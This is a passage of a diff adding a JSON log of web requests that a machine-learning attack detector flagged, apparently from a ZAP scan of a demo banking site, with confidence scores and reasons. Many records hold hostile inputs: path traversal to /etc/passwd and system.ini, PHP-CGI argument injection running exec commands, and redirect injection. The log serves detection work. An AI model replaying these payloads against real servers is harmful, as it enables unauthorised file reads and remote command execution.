@@ -1,0 +1,3079 @@
+[{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896b3"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=Login",
+  "Confidence_Score": 0.9984792172908783,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896b4"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9954387247562408,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896b5"
+  },
+  "path": "/admin/clients.xls",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9896112084388733,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896b6"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_deposit.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9114800691604614,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896b7"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8672274947166443,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896b8"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9163933396339417,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896b9"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/cgi.exe",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.7290870845317841,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ba"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=inside_press.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8895814716815948,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896bb"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=inside_careers.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9009794592857361,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896bc"
+  },
+  "path": "/admin/5426747126540156233",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9774501323699951,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896bd"
+  },
+  "path": "/my%20documents/4334254300613932666.jsp",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5730828195810318,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896be"
+  },
+  "path": "/my%20documents/JohnSmith/543395271288856021.jsp",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6288686543703079,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896bf"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/1982477551809814812.jsp",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8225953280925751,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c0"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=c%3A%2FWindows%2Fsystem.ini&btnSubmit=Subscribe",
+  "Confidence_Score": 0.9965081214904785,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c1"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=c%3A%2FWindows%2Fsystem.ini&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9993420541286469,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c2"
+  },
+  "path": "/doLogin",
+  "body": "uid=c%3A%2FWindows%2Fsystem.ini&passw=ZAP&btnSubmit=Login",
+  "Confidence_Score": 0.99997878074646,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c3"
+  },
+  "path": "/Documents/JohnSmith",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5367974191904068,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c4"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9995776414871216,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c5"
+  },
+  "path": "/Documents/JohnSmith/index.jsp?content=c%3A%5CWindows%5Csystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.7716991901397705,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c6"
+  },
+  "path": "/doLogin",
+  "body": "uid=c%3A%5CWindows%5Csystem.ini&passw=ZAP&btnSubmit=Login",
+  "Confidence_Score": 0.99997878074646,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c7"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=c%3A%5CWindows%5Csystem.ini&btnSubmit=Subscribe",
+  "Confidence_Score": 0.9965081214904785,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c8"
+  },
+  "path": "/Privacypolicy.jsp?sec=c%3A%5CWindows%5Csystem.ini&template=US",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8063597679138184,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896c9"
+  },
+  "path": "/disclaimer.htm?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.7834475636482239,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ca"
+  },
+  "path": "/default.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.7881383001804352,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896cb"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=%2Fetc%2Fpasswd&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9953399002552032,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896cc"
+  },
+  "path": "/images/index.jsp?content=c%3A%2FWindows%2Fsystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8797070384025574,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896cd"
+  },
+  "path": "/Documents/JohnSmith/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8924484848976135,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ce"
+  },
+  "path": "/default.jsp?content=c%3A%5CWindows%5Csystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9142475128173828,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896cf"
+  },
+  "path": "/Privacypolicy.jsp?sec=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&template=US",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8705192506313324,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d0"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9984288811683655,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d1"
+  },
+  "path": "/disclaimer.htm?url=c%3A%5CWindows%5Csystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9201047718524933,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d2"
+  },
+  "path": "/images/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.814881443977356,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d3"
+  },
+  "path": "/my%20documents",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5443328619003296,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d4"
+  },
+  "path": "/index.jsp?content=c%3A%2FWindows%2Fsystem.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9256835877895355,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d5"
+  },
+  "path": "/Documents/JohnSmith/index.jsp?content=%2Fetc%2Fpasswd",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6265269815921783,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d6"
+  },
+  "path": "/index.jsp?content=c%3A%2FWindows%2Fsystem.ini&job=MortgageLendingAccountExecutive%3ASales",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.7665125727653503,
+  "Severity": 2,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d7"
+  },
+  "path": "/doLogin",
+  "body": "uid=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&passw=ZAP&btnSubmit=Login",
+  "Confidence_Score": 0.9949098479747772,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d8"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&btnSubmit=Subscribe",
+  "Confidence_Score": 0.9865224361419678,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896d9"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=c%3A%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9944691061973572,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896da"
+  },
+  "path": "/my%20documents/JohnSmith",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5425118692219257,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896db"
+  },
+  "path": "/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896dc"
+  },
+  "path": "/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896dd"
+  },
+  "path": "/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896de"
+  },
+  "path": "/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896df"
+  },
+  "path": "/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e0"
+  },
+  "path": "/retirement.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e1"
+  },
+  "path": "/sameDomain?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e2"
+  },
+  "path": "/sitemap.xml?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e3"
+  },
+  "path": "/security.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e4"
+  },
+  "path": "/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e5"
+  },
+  "path": "/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e6"
+  },
+  "path": "/pr/communityannualreport.pdf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e7"
+  },
+  "path": "/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e8"
+  },
+  "path": "/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896e9"
+  },
+  "path": "/status_check.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ea"
+  },
+  "path": "/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896eb"
+  },
+  "path": "/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ec"
+  },
+  "path": "/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ed"
+  },
+  "path": "/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ee"
+  },
+  "path": "/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ef"
+  },
+  "path": "/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f0"
+  },
+  "path": "/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f1"
+  },
+  "path": "/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f2"
+  },
+  "path": "/swagger/swagger-ui-bundle.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f3"
+  },
+  "path": "/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f4"
+  },
+  "path": "/swagger/swagger-ui-standalone-preset.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f5"
+  },
+  "path": "/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f6"
+  },
+  "path": "/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+  "body": "<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(\"\n\",$colm);die();?>",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f7"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27",
+  "Confidence_Score": 0.9999992251396179,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f8"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
